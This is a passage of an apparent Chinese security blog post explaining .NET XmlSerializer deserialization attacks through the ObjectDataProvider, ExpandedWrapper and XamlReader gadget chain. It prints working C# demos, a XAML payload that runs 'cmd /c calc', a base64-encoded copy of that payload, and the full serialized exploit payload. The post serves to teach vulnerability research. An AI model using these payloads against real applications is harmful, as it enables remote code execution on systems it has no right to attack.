+</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="n">anyType</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;/</span><span class="n">MethodParameters</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="n">ObjectInstance</span> <span class="n">xsi</span><span class="err">:</span><span class="n">type</span><span class="p">=</span><span class="s2">&#34;XamlReader&#34;</span><span class="p">&gt;&lt;/</span><span class="n">ObjectInstance</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="n">ProjectedProperty0</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="n">ExpandedWrapperOfXamlReaderObjectDataProvider</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">root</span><span class="p">&gt;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>来介绍一下这个payload</p>
+<h3 id="objectdataprovider" class="heading-element"><span>ObjectDataProvider</span>
+  <a href="#objectdataprovider" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>ObjectDataProvider类，位于<code>System.Windows.Data</code>命名空间下，可以调用任意被引用类中的方法，提供成员<code>ObjectInstance</code>用类似实例化类、成员<code>MethodName</code>调用指定类型的方法的名称、成员<code>MethodParameters</code>表示传递给方法的参数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">ObjectDataProvider</span> <span class="n">object1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ObjectDataProvider</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl"><span class="n">object1</span><span class="p">.</span><span class="n">ObjectInstance</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Person</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl"><span class="n">object1</span><span class="p">.</span><span class="n">MethodName</span> <span class="p">=</span> <span class="s">&#34;Evil&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">object1</span><span class="p">.</span><span class="n">MethodParameters</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>再给<code>Person</code>类定义一个<code>Evil</code>方法，代码实现调用<code>System.Diagnostics.Process.Start()</code>启动新的进程弹出计算器。如果用<code>XmlSerializer</code>直接序列化抛出异常，因为在序列化过程中<code>ObjectInstance</code>这个成员类型未知，不过可以使用<code>ExpandedWrapper</code>扩展类在系统内部预知先加载相关实体的查询来避免异常错误。<br>
+Demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Windows.Data</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Xml.Serialization</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Data.Services.Internal</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">XmlDeserialization</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="na">    [XmlRoot]</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">Person</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">Evil</span><span class="p">(</span><span class="kt">string</span> <span class="n">cmd</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Process</span> <span class="n">process</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Process</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="s">&#34;cmd.exe&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s">&#34;/c &#34;</span> <span class="p">+</span> <span class="n">cmd</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">process</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">TextWriter</span> <span class="n">writer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">ExpandedWrapper</span><span class="p">&lt;</span><span class="n">Person</span><span class="p">,</span> <span class="n">ObjectDataProvider</span><span class="p">&gt;</span> <span class="n">expandedWrapper</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ExpandedWrapper</span><span class="p">&lt;</span><span class="n">Person</span><span class="p">,</span> <span class="n">ObjectDataProvider</span><span class="p">&gt;();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">expandedWrapper</span><span class="p">.</span><span class="n">ProjectedProperty0</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ObjectDataProvider</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">expandedWrapper</span><span class="p">.</span><span class="n">ProjectedProperty0</span><span class="p">.</span><span class="n">MethodName</span> <span class="p">=</span> <span class="s">&#34;Evil&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">expandedWrapper</span><span class="p">.</span><span class="n">ProjectedProperty0</span><span class="p">.</span><span class="n">MethodParameters</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">expandedWrapper</span><span class="p">.</span><span class="n">ProjectedProperty0</span><span class="p">.</span><span class="n">ObjectInstance</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Person</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">XmlSerializer</span> <span class="n">xml</span> <span class="p">=</span> <span class="k">new</span> <span class="n">XmlSerializer</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">ExpandedWrapper</span><span class="p">&lt;</span><span class="n">Person</span><span class="p">,</span> <span class="n">ObjectDataProvider</span><span class="p">&gt;));</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">xml</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span> <span class="n">expandedWrapper</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="kt">string</span> <span class="n">result</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">());</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">memoryStream</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">xml</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506032051674.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506032051674.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506032051674.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506032051674.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506032051674.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506032051674.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+但是这样显得就很鸡肋了。此时我们需要引入一个新的类<code>ResourceDictionary</code></p>
+<h3 id="resourcedictionary" class="heading-element"><span>ResourceDictionary</span>
+  <a href="#resourcedictionary" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>ResorceDictionary</code>，也称为资源字典通常出现在<code>WPF</code>或<code>UWP</code>应用程序中用来在多个程序集间共享静态资源。既然是WPF程序，必然涉及到前端UI设计语言XAML。XAML全称<code>Extensinle Application Markup Language</code>基于XML的，且<code>XAML</code>是以一个树形结构作为整体。<br>
+它是可以直接执行命令的<br>
+Demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;ResourceDictionary</span>   
+</span></span><span class="line"><span class="cl">                    <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;</span>   
+</span></span><span class="line"><span class="cl">                    <span class="na">xmlns:d=</span><span class="s">&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;</span>   
+</span></span><span class="line"><span class="cl">                    <span class="na">xmlns:b=</span><span class="s">&#34;clr-namespace:System;assembly=mscorlib&#34;</span>   
+</span></span><span class="line"><span class="cl">                    <span class="na">xmlns:c=</span><span class="s">&#34;clr-namespace:System.Diagnostics;assembly=system&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ObjectDataProvider</span> <span class="na">d:Key=</span><span class="s">&#34;&#34;</span> <span class="na">ObjectType=</span><span class="s">&#34;{d:Type c:Process}&#34;</span> <span class="na">MethodName=</span><span class="s">&#34;Start&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ObjectDataProvider.MethodParameters&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;b:String&gt;</span>cmd<span class="nt">&lt;/b:String&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;b:String&gt;</span>/c calc<span class="nt">&lt;/b:String&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/ObjectDataProvider.MethodParameters&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/ObjectDataProvider&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ResourceDictionary&gt;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段xaml</p>
+<ul>
+<li>xmlns:c 引用了System.Diagnostics命名空间起别名为c</li>
+<li>d:Key=&quot;&quot; 起别名为空，在xaml语法中，Key这个键值必须有。</li>
+<li>ObjectType表示对象类型</li>
+<li>d:Type 等同于typeof()</li>
+<li>MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。</li>
+<li>c:Process等同于<code>System.Diagnostics.Process</code></li>
+</ul>
+<p>整个xaml被解析之后，等同于创建了一个<code>ObjectDataProvider</code>对象，该对象又会自动调用<code>System.Diagnostics.Process.Start(&quot;cmd.exe&quot;.&quot;/c calc&quot;)</code><br>
+因为是xaml的语言，所以我们可以使用<code>XamlReader.Parse()</code>来解析它，运行之后弹出<code>calc</code>。其中<code>base64</code>的内容，正是上面的<code>payload</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Windows.Markup</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">XmlDeserialization</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="kt">string</span> <span class="n">p</span> <span class="p">=</span> <span class="s">&#34;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="p">[]</span> <span class="n">vs</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="kt">string</span> <span class="n">xml</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">vs</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">XamlReader</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">xml</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时，我们就可以直接用<code>ObjectDataProvider</code>调用<code>XamlReader.Parse()</code>方法了。<br>
+此时我们再来看一下yso生成的payload，就一目了然了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;root</span> <span class="na">type=</span><span class="s">&#34;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ExpandedWrapperOfXamlReaderObjectDataProvider</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ExpandedElement/&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ProjectedProperty0&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;MethodName&gt;</span>Parse<span class="nt">&lt;/MethodName&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;MethodParameters&gt;</span>  
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;anyType</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="na">xsi:type=</span><span class="s">&#34;xsd:string&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl">                    <span class="cp">&lt;![CDATA[&lt;ResourceDictionary xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:d=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34; xmlns:b=&#34;clr-namespace:System;assembly=mscorlib&#34; xmlns:c=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&gt;&lt;ObjectDataProvider d:Key=&#34;&#34; ObjectType=&#34;{d:Type c:Process}&#34; MethodName=&#34;Start&#34;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;</span>  
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/anyType&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/MethodParameters&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;ObjectInstance</span> <span class="na">xsi:type=</span><span class="s">&#34;XamlReader&#34;</span><span class="nt">&gt;&lt;/ObjectInstance&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/ProjectedProperty0&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/root&gt;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-06-03 23:27:25">Updated on 2025-06-03&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/dot-net-xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-title="Dot NET-XmlSerializer反序列化漏洞"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-tag" title="Tags - XmlSerializer反序列化漏洞">XmlSerializer反序列化漏洞</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/dot-net%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-nav-item" rel="prev" title="Dot NET序列化基础知识"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Dot NET序列化基础知识</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
